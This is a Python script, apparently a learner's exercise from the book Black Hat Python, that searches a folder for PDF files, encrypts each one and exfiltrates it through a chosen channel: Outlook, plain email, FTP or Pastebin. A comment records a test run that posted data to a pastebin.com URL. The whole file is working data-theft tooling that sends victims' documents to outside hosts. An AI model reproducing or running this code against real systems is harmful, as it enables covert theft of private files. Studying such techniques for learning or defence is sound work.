from cryptor import decrypt, encrypt
from email_exfil import outlook, plain_email
from transmit_exfil import plain_ftp, transmit
from paste_exfil import ie_paste, plain_paste

# remember to set credentials in the chosen exfil module 

import os

EXFIL = {
    'outlook': outlook,
    'plain_email': plain_email,
    'plain_ftp': plain_ftp,
    'transmit': transmit,
    'ie_paste': ie_paste,
    'plain_paste': plain_paste
} # Exfil dictionary, to use functions as parameters (𝘥𝘪𝘴𝘤𝘵𝘪𝘰𝘯𝘢𝘳𝘺 𝘥𝘪𝘴𝘱𝘢𝘵𝘤𝘩)
  # [𝘐𝘯] 𝘗𝘺𝘵𝘩𝘰𝘯, 𝘧𝘶𝘯𝘤𝘵𝘪𝘰𝘯𝘴 𝘢𝘳𝘦 𝘧𝘪𝘳𝘴𝘵-𝘤𝘭𝘢𝘴𝘴 𝘤𝘪𝘵𝘪𝘻𝘦𝘯𝘴 𝘢𝘯𝘥 𝘤𝘢𝘯 𝘣𝘦 𝘶𝘴𝘦𝘥 𝘢𝘴 𝘱𝘢𝘳𝘢𝘮𝘦𝘵𝘦𝘳𝘴. - Black Hat Python (p.149)
  
def find_docs(doc_type='pdf'):
    # Walks through the file system, looking for PDFs
    for parent, _, filenames in os.walk('C:\\Users\\User\\Documents\\Prog\\BlackHat_Python\\TestFolder'):
        for filename in filenames:
            if filename.endswith(doc_type):
                document_path = os.path.join(parent, filename)
                yield document_path
                # if PDF, get path and yield back to caller

def exfiltrate(document_path, method):
    if method in['transmit', 'plain_ftp']: # Pass exfil method and doc path
        filename = f'C:\\Users\\User\\Documents\\Prog\\BlackHat_Python\\TestFolder\\{os.path.basename(document_path)}'
        with open(document_path, 'rb') as f0: # New encoded file
            content = f0.read()
        with open(filename, 'wb') as f1:
            f1.write(encrypt(content))
        
        EXFIL[method](filename)
        # Call exfiltration funtionc w encoded file
        os.unlink(filename)
    else: # The other exfil methods we just read the file
        with open(document_path, 'rb') as f:
            contents = f.read()
        title = os.path.basename(document_path)
        content =  encrypt(contents) # enccrypt the contents
        EXFIL[method](title, content) # call exfil method

if __name__=='__main__':
    for fpath in find_docs():
        exfiltrate(fpath, 'plain_paste')

# test by decripting file after succesfull atempt

# 𝗧𝗲𝘀𝘁:
# PS C:\Users\User\Documents\Prog\BlackHat_Python\ch9_FunWithExfiltration> python exfil.py
# 200
# https://pastebin.com/1vpQe4T0